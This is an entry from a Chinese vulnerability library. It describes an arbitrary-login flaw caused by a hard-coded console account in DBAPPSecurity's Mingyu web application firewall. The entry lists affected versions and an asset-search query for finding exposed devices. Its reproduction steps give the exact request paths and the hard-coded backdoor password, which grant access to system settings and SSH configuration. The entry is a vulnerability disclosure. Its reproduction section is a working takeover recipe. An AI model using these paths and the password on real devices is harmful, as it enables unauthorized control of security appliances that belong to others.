---
fofa: "app.name="
source: "wy876 漏洞文库"
---

# 安恒明御Web应用防火墙任意登录漏洞

# 一、漏洞简介
<font style="color:rgb(36, 41, 46);">安恒 明御WEB应用防火墙 report.php文件存在硬编码设置的Console用户登录</font>

# <font style="color:rgb(36, 41, 46);">二、影响版本</font>
+ <font style="color:rgb(36, 41, 46);">明御 WAF X86 架构 <= 4.6.33</font>
+ <font style="color:rgb(36, 41, 46);">明御 WAF 信创兆芯 = 4.5</font>
+ <font style="color:rgb(36, 41, 46);">明御 WAF 鲲鹏 = 4.6.18</font>

# <font style="color:rgb(36, 41, 46);">三、资产测绘</font>
+ hunter：`app.name="安恒明御 WEB应用防火墙"`


+ 登录页面


# 四、漏洞复现
1. 访问poc

```plain
/report.m?a=rpc-timed
```


2. <font style="color:rgb(36, 41, 46);">接着删除路径信息，再次访问登录界面就会出现这个界面</font>


3. 访问下面这个路径，进入系统设置（不能直接点系统设置），就可以更改SSH的配置了。

```plain
/system.m?a=reserved
```


4. 在密码框中，输入密码,就可以更改SSH配置,也可查看其他菜单

```plain
!@#dbapp-waf-dev-reserved#@!
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fg8ocgvc7bpywni4>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
